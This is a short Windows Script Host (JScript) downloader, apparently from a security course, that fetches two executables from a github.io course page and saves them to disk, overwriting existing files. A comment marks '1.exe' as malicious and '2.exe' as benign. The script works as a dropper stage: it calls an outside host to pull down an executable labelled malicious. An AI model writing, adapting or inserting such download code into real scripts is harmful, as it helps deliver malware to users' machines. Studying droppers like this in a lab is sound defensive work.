
function downloadFile(fileName) {
    var Source = "https://dryairship.github.io/cs658a/"+fileName;
    var Target = fileName;
    var Object = WScript.CreateObject('MSXML2.XMLHTTP');

    Object.Open('GET', Source, false);
    Object.Send();

    if (Object.Status == 200)
    {
        var Stream = WScript.CreateObject('ADODB.Stream');

        Stream.Open();
        Stream.Type = 1;
        Stream.Write(Object.ResponseBody);
        Stream.Position = 0;

        var File = WScript.CreateObject('Scripting.FileSystemObject');
        if (File.FileExists(Target))
        {
            File.DeleteFile(Target);
        }

        Stream.SaveToFile(Target, 2);
        Stream.Close();
    }
}

downloadFile("1.exe"); // malicious file
downloadFile("2.exe"); // benign file
